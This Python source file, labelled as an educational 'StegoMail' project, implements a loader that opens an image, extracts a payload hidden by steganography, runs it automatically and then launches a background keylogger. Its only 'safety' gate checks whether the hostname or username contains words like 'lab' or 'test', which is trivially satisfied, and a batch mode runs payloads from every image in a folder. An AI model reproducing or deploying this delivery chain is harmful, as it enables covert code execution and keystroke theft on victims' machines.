"""
Image opener and payload trigger for steganographic execution.
Simulates opening an image and automatically executing embedded payloads.

Author: Educational Cybersecurity Project
Warning: For educational use only in controlled environments.
"""

import os
import sys
import time
import logging
import threading
from PIL import Image
import subprocess
import platform

# Import local modules
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from steg.decoder import StegoDecoder
from logger.keylogger import StegoKeylogger

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class StegoImageOpener:
    """
    Simulates opening an image and triggers execution of embedded payloads.
    Educational demonstration of steganographic payload deployment.
    """
    
    def __init__(self, config_path="config.json"):
        """
        Initialize the image opener.
        
        Args:
            config_path (str): Path to configuration file
        """
        self.config_path = config_path
        self.decoder = StegoDecoder(config_path)
        self.display_image = True
        self.auto_execute = True
        self.stealth_mode = False
        
    def check_environment(self):
        """
        Check if running in a safe educational environment.
        
        Returns:
            dict: Environment check results
        """
        try:
            env_info = {
                "platform": platform.system(),
                "hostname": platform.node(),
                "user": os.environ.get("USER", os.environ.get("USERNAME", "Unknown")),
                "is_virtual": False,
                "safe_to_run": False
            }
            
            # Basic VM detection for educational safety
            vm_indicators = [
                "virtual", "vmware", "vbox", "qemu", "kvm", 
                "virtualbox", "docker", "container"
            ]
            
            hostname_lower = env_info["hostname"].lower()
            for indicator in vm_indicators:
                if indicator in hostname_lower:
                    env_info["is_virtual"] = True
                    break
            
            # Check for educational/lab environment indicators
            safe_indicators = [
                "lab", "test", "edu", "student", "training",
                "sandbox", "demo", "learn"
            ]
            
            for indicator in safe_indicators:
                if (indicator in hostname_lower or 
                    indicator in env_info["user"].lower()):
                    env_info["safe_to_run"] = True
                    break
            
            # Additional safety check for virtual environments
            if env_info["is_virtual"]:
                env_info["safe_to_run"] = True
            
            return env_info
            
        except Exception as e:
            logger.error(f"Environment check failed: {e}")
            return {"error": str(e), "safe_to_run": False}
    
    def display_image_safely(self, image_path):
        """
        Display image using system default viewer.
        
        Args:
            image_path (str): Path to image file
            
        Returns:
            bool: True if display successful
        """
        try:
            logger.info(f"Displaying image: {image_path}")
            
            # Verify image exists and is valid
            if not os.path.exists(image_path):
                logger.error(f"Image file not found: {image_path}")
                return False
            
            # Test image validity
            try:
                with Image.open(image_path) as img:
                    width, height = img.size
                    logger.info(f"Image size: {width}x{height}")
            except Exception as e:
                logger.error(f"Invalid image file: {e}")
                return False
            
            # Platform-specific image display
            system = platform.system()
            
            if system == "Windows":
                os.startfile(image_path)
            elif system == "Darwin":  # macOS
                subprocess.run(["open", image_path])
            elif system == "Linux":
                # Try common Linux image viewers
                viewers = ["xdg-open", "eog", "feh", "display"]
                for viewer in viewers:
                    try:
                        subprocess.run([viewer, image_path], check=True)
                        break
                    except (subprocess.CalledProcessError, FileNotFoundError):
                        continue
                else:
                    logger.warning("No suitable image viewer found")
                    return False
            
            logger.info("Image displayed successfully")
            return True
            
        except Exception as e:
            logger.error(f"Failed to display image: {e}")
            return False
    
    def analyze_image_steganography(self, image_path):
        """
        Analyze image for steganographic content.
        
        Args:
            image_path (str): Path to image file
            
        Returns:
            dict: Analysis results
        """
        try:
            logger.info("Analyzing image for steganographic content...")
            
            analysis = self.decoder.analyze_image(image_path)
            
            logger.info("Analysis Results:")
            logger.info(f"  File size: {analysis.get('file_size', 0)} bytes")
            logger.info(f"  Image format: {analysis.get('image_format', 'Unknown')}")
            logger.info(f"  Image dimensions: {analysis.get('image_size', 'Unknown')}")
            logger.info(f"  Estimated capacity: {analysis.get('estimated_capacity', 0)} bytes")
            logger.info(f"  Contains StegoMail payload: {analysis.get('has_stegomail_markers', False)}")
            
            return analysis
            
        except Exception as e:
            logger.error(f"Image analysis failed: {e}")
            return {"error": str(e)}
    
    def extract_and_execute_payload(self, image_path):
        """
        Extract and execute embedded payload from image.
        
        Args:
            image_path (str): Path to steganographic image
            
        Returns:
            bool: True if extraction and execution successful
        """
        try:
            logger.info("=== PAYLOAD EXTRACTION AND EXECUTION ===")
            logger.info("Starting steganographic payload extraction...")
            
            # Extract payload
            success, payload_content, metadata = self.decoder.extract_payload(image_path)
            
            if not success:
                logger.error("Payload extraction failed")
                return False
            
            if not payload_content:
                logger.info("No payload found in image")
                return False
            
            logger.info("Payload extracted successfully")
            logger.info(f"Payload size: {len(payload_content)} characters")
            
            if metadata:
                logger.info(f"Payload type: {metadata.get('type', 'unknown')}")
                logger.info(f"Encryption method: {metadata.get('encryption', 'unknown')}")
            
            # Safety check before execution
            env_check = self.check_environment()
            if not env_check.get("safe_to_run", False):
                logger.warning("Environment safety check failed")
                logger.warning("Payload execution aborted for safety")
                logger.info("This appears to be a production environment")
                return False
            
            logger.info("Environment safety check passed")
            
            # Execute payload if auto-execution is enabled
            if self.auto_execute:
                logger.info("Auto-execution enabled - executing payload...")
                
                # Small delay to simulate natural behavior
                time.sleep(1)
                
                # Execute the payload
                execution_success = self.decoder.execute_payload(payload_content, metadata)
                
                if execution_success:
                    logger.info("Payload execution completed successfully")
                    
                    # If the payload is a keylogger, start it in background
                    if "keylogger" in payload_content.lower():
                        logger.info("Detected keylogger payload - starting background logging")
                        self.start_background_keylogger()
                    
                    return True
                else:
                    logger.error("Payload execution failed")
                    return False
            else:
                logger.info("Auto-execution disabled - payload extracted only")
                return True
                
        except Exception as e:
            logger.error(f"Payload extraction/execution failed: {e}")
            return False
    
    def start_background_keylogger(self):
        """
        Start keylogger in background (educational demonstration).
        """
        try:
            logger.info("Starting educational keylogger in background...")
            
            # Create keylogger instance
            keylogger = StegoKeylogger(self.config_path)
            
            # Start in background for demonstration (short duration)
            thread = keylogger.run_background(duration=30)  # 30 seconds for demo
            
            if thread:
                logger.info("Educational keylogger started (30-second demo)")
            else:
                logger.error("Failed to start keylogger")
                
        except Exception as e:
            logger.error(f"Background keylogger start failed: {e}")
    
    def simulate_image_open(self, image_path, show_image=True):
        """
        Simulate opening an image file and trigger payload execution.
        
        Args:
            image_path (str): Path to image file
            show_image (bool): Whether to display the image
            
        Returns:
            bool: True if operation successful
        """
        try:
            logger.info("=== SIMULATING IMAGE OPEN ===")
            logger.info(f"Opening image: {image_path}")
            
            # Validate image file
            if not os.path.exists(image_path):
                logger.error(f"Image file not found: {image_path}")
                return False
            
            # Display image if requested
            if show_image and self.display_image:
                self.display_image_safely(image_path)
                time.sleep(2)  # Allow time for image to display
            
            # Analyze image for steganographic content
            analysis = self.analyze_image_steganography(image_path)
            
            # Check if image contains steganographic payload
            if analysis.get('has_stegomail_markers', False):
                logger.info("StegoMail payload detected in image!")
                
                # Extract and execute payload
                success = self.extract_and_execute_payload(image_path)
                
                if success:
                    logger.info("Image opening simulation completed successfully")
                    return True
                else:
                    logger.error("Payload execution failed")
                    return False
            else:
                logger.info("No steganographic payload detected")
                logger.info("Image opened normally (no hidden content)")
                return True
                
        except Exception as e:
            logger.error(f"Image opening simulation failed: {e}")
            return False
    
    def batch_process_images(self, image_directory):
        """
        Process multiple images in a directory.
        
        Args:
            image_directory (str): Directory containing images
            
        Returns:
            dict: Processing results
        """
        try:
            results = {
                "total_images": 0,
                "processed": 0,
                "payloads_found": 0,
                "executions_successful": 0,
                "errors": []
            }
            
            if not os.path.exists(image_directory):
                logger.error(f"Directory not found: {image_directory}")
                return results
            
            # Get list of image files
            image_extensions = ['.png', '.jpg', '.jpeg', '.bmp', '.gif', '.tiff']
            image_files = []
            
            for file in os.listdir(image_directory):
                if any(file.lower().endswith(ext) for ext in image_extensions):
                    image_files.append(os.path.join(image_directory, file))
            
            results["total_images"] = len(image_files)
            logger.info(f"Found {len(image_files)} image files to process")
            
            # Process each image
            for image_path in image_files:
                try:
                    logger.info(f"Processing: {os.path.basename(image_path)}")
                    
                    # Analyze image
                    analysis = self.analyze_image_steganography(image_path)
                    results["processed"] += 1
                    
                    if analysis.get('has_stegomail_markers', False):
                        results["payloads_found"] += 1
                        logger.info("Payload detected - extracting...")
                        
                        success = self.extract_and_execute_payload(image_path)
                        if success:
                            results["executions_successful"] += 1
                    
                except Exception as e:
                    error_msg = f"Failed to process {image_path}: {e}"
                    logger.error(error_msg)
                    results["errors"].append(error_msg)
            
            # Report results
            logger.info("Batch processing completed:")
            logger.info(f"  Total images: {results['total_images']}")
            logger.info(f"  Processed: {results['processed']}")
            logger.info(f"  Payloads found: {results['payloads_found']}")
            logger.info(f"  Successful executions: {results['executions_successful']}")
            logger.info(f"  Errors: {len(results['errors'])}")
            
            return results
            
        except Exception as e:
            logger.error(f"Batch processing failed: {e}")
            return {"error": str(e)}


def demo_opener():
    """
    Demonstration of the image opener functionality.
    """
    print("=== StegoImageOpener Demo ===")
    print("Educational steganographic image opening simulation")
    
    opener = StegoImageOpener()
    
    # Environment check
    print("\n1. Checking environment safety...")
    env_check = opener.check_environment()
    print(f"   Platform: {env_check.get('platform', 'Unknown')}")
    print(f"   Hostname: {env_check.get('hostname', 'Unknown')}")
    print(f"   User: {env_check.get('user', 'Unknown')}")
    print(f"   Virtual environment: {env_check.get('is_virtual', False)}")
    print(f"   Safe to run: {env_check.get('safe_to_run', False)}")
    
    # Check for test images
    print("\n2. Looking for test images...")
    test_images = ["sample_cover.png", "stego_image.png", "encoded.png"]
    
    for image_path in test_images:
        if os.path.exists(image_path):
            print(f"\n   Found: {image_path}")
            print("   Analyzing image...")
            
            analysis = opener.analyze_image_steganography(image_path)
            
            if analysis.get('has_stegomail_markers', False):
                print("   -> Contains StegoMail payload!")
                print("   Use main.py --open to simulate opening and execution")
            else:
                print("   -> Normal image (no steganographic content)")
        else:
            print(f"   {image_path}: Not found")
    
    print("\nDemo completed!")
    print("Use main.py to perform actual image opening simulation.")


if __name__ == "__main__":
    demo_opener()